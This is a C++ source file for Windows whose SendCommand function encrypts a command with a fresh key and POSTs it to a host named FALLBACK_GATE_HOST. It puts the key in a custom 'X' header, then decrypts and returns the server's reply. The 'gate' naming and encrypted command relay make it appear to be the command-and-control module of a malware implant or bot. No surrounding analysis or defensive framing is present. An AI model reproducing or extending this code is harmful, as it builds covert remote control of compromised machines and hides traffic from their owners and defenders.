#include "Conf.h"
#include "HttpQuery.h"
#include "Connecter.h"
#include "Cipher.h"

#include <string>
#include <windows.h>

char* SendCommand(char* command) {

    //gen key
    char* key;
    key = GenerateKey(32);
    char* encodedKey;

    char* encodedResult = EncryptWithKey(command, (char *)key, strlen(command), 32, &encodedKey);
    free(key);

    //for debug
    wchar_t str[100];

    swprintf(str, 100, L"encodedKey :%hs\n", encodedKey);
    //OutputDebugString(str);
    swprintf(str, 100, L"encodedResult :%hs\n", encodedResult);
    //OutputDebugString(str);
    int temp_outputLength = 0;
    char* decodedResult = DecryptWithKey(encodedResult, encodedKey, &temp_outputLength);
    swprintf(str, 100, L"decodedResult :%hs\n", decodedResult);
    OutputDebugString(str);
    free(decodedResult);
   

    //gen header & post data
    NameValuePair* headers[] = {
        new NameValuePair((char *)"X", (char* )encodedKey),
        0
    };

	NameValuePair* postData[] = {
		new NameValuePair((char*)"x", encodedResult),
		0
	};

    NameValuePair** returnedHeaders;
    char* returnedData;
    int dataLength;

    //send requests
    int result = HTTPQuery((char*)FALLBACK_GATE_HOST, (char*)FALLBACK_COMMAND_PATH, headers, &returnedHeaders, &returnedData, &dataLength, (char *)"POST", true, postData);
    free(encodedResult);

    int outputLength;
    char* output = DecryptWithKey(returnedData, encodedKey, &outputLength);
    free(encodedKey);

    char* returnBuffer = (char*)malloc(outputLength + 1);
    returnBuffer[outputLength] = 0;
    memcpy_s(returnBuffer, outputLength, output, outputLength);

    int i;
    for ( i = 0; headers[i]; i++) {
        delete (headers[i]);
    }

    i = 0;
    for (i = 0; postData[i]; i++) {
        delete (postData[i]);
    }

    FreeHTTPResponse(returnedHeaders, returnedData);

    return returnBuffer;
}